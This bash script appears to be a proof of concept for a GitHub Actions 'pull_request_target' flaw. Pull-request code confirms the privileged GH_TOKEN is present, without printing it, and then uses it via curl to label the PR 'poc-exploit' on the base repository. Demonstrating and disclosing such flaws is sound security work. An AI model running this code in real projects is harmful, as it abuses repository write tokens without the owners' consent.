#!/usr/bin/env bash
set -euo pipefail

echo "[PoC] Running PR-controlled code inside pull_request_target context."

# Prove we can touch the privileged token (without leaking it)
if [[ -n "${GH_TOKEN:-}" ]]; then
  echo "[PoC] GH_TOKEN present. Length: ${#GH_TOKEN}"
else
  echo "[PoC] GH_TOKEN is NOT present" && exit 1
fi

# Use that token to WRITE to the base repo (label this PR)
echo "[PoC] Adding label 'poc-exploit' to PR #${PR_NUMBER} on ${REPO}..."
curl -sS -X POST \
  -H "Authorization: Bearer ${GH_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${REPO}/issues/${PR_NUMBER}/labels" \
  -d '{"labels":["poc-exploit"]}' >/dev/null

echo "[PoC] Done. Check the PR labels — if you see 'poc-exploit', PR code used a powerful token."
